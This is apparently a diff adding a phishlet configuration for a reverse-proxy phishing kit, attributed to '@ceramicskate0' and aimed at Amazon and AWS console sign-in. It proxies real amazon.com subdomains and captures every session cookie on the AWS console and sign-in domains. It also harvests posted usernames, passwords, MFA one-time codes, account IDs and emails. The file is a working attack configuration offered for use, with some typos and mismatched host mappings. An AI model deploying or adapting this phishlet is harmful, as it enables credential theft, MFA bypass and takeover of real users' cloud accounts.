@@ -1,0 +1,148 @@
+#Your gonna have to make this work on your own. Sub domains and all.
+#us-east-1
+#us-east-2
+
+#us-west-1
+#us-west-2
+
+#eu-west-3
+
+#ca-central-1
+
+#eu-central-1
+
+#eu-west-1
+#eu-west-2
+
+#eu-north-1
+
+#ap-east-1
+
+#ap-northeast-1
+#ap-northeast-2
+#ap-northeast-3
+
+#ap-southeast-1
+#ap-southeast-2
+
+#ap-south-1
+#me-south-1
+
+#sa-east-1
+
+name: 'aws'
+author: '@ceramicskate0'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aws', orig_sub: 'aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'console.aws', orig_sub: 'console.aws', domain: 'amazon.com', session: false, is_landing: false,auto_filter: true}
+  - {phish_sub: 'signin.aws', orig_sub: 'signin.aws', domain: 'amazon.com', session: true, is_landing: true,auto_filter: true}
+  - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: true, is_landing: false,auto_filter: true}
+  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: true, is_landing: false,a uto_filter: true}
+  - {phish_sub: 'us-east-2.console.aws', orig_sub: 'us-east-2.console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us-east-2.signin.aws', orig_sub: 'us-east-2.signin.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us-east-1.console.aws', orig_sub: 'us-east-1.console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us-east-1.signin.aws', orig_sub: 'us-east-1.signin.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us-west-1.console.aws', orig_sub: 'us-east-1.console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us-west-1.signin.aws', orig_sub: 'us-east-1.signin.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us-west-2.signin.aws', orig_sub: 'us-west-2.signin.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us-west-2.console.aws', orig_sub: 'us-east-2.console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'aws.amazon.com', orig_sub: 'aws', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'aws.amazon.com', orig_sub: 'aws', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'aws.amazon.com', orig_sub: 'aws', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'aws.amazon.com', orig_sub: 'aws', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'aws.amazon.com', orig_sub: 'aws', domain: 'amazon.com', search: '"https://{hostname}', replace: '"https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']} 
+  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'console.aws', domain: 'amazon.com', search: '"https://{hostname}', replace: '"https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'signin.aws.amazon.com', orig_sub: 'signin.aws', domain: 'amazon.com', search: '"https://{hostname}', replace: '"https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'signin.aws.amazon.com', orig_sub: 'signin.aws', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'signin.aws.amazon.com', orig_sub: 'signin.aws', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'signin.aws.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'console.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/xml'], redirect_only: true}
+  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'console.aws', domain: 'amazon.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/xml'], redirect_only: true}
+  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'console.aws', domain: 'amazon.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'us-east-2.console.aws', orig_sub: 'us-east-2.console.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'us-east-2.signin.aws', orig_sub: 'us-east-2.signin.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'us-east-1.console.aws', orig_sub: 'us-east-1.console.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'us-east-1.signin.aws', orig_sub: 'us-east-1.signin.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'us-west-1.console.aws', orig_sub: 'us-west-1.console.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'us-west-1.signin.aws', orig_sub: 'us-west-1.signin.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'us-west-2.signin.aws', orig_sub: 'us-west-2.signin.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'us-west-2.console.aws', orig_sub: 'us-west-1.console.aws', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: '.amazon.com'
+    keys: ['.*,regexp']
+  - domain: 'aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: '.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: 'console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: '.console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: 'signin.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: '.signin.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: 'us-east-1.console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: '.us-east-1.console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: 'us-east-2.console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: '.us-east-2.console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: '.us-west-1.console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: '.us-west-2.console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: 'us-west-1.console.aws.amazon.com'
+    keys: ['.*,regexp']
+  - domain: 'us-west-2.console.aws.amazon.com'
+    keys: ['.*,regexp']
+    
+auth_urls:
+  - '/authenticate'
+  - '/authenticate/.*'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+  - key: 'mfa_otp_1'
+    search: '(.*)'
+    type: 'post'
+  - key: 'account'
+    search: '(.*)'
+    type: 'post'
+  - key: 'action'
+    search: '([^"]*)'
+    type: 'post'
+  - key: 'email'
+    search: '([^"]*)'
+    type: 'post'
+  - key: 'statusCode'
+    search: '([^"]*)'
+    type: 'post'
+  - key: ''
+    search: '([^"]*)'
+    type: 'json'
+
+login :
+  domain: 'signin.aws.amazon.com'
+  path: '/signin?redirect_uri=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fstate%3DhashArgs%2523%26isauthcode%3Dtrue&client_id=arn%3Aaws%3Aiam%3A%3A015428540659%3Auser%2Fhomepage&forceMobileApp=0'
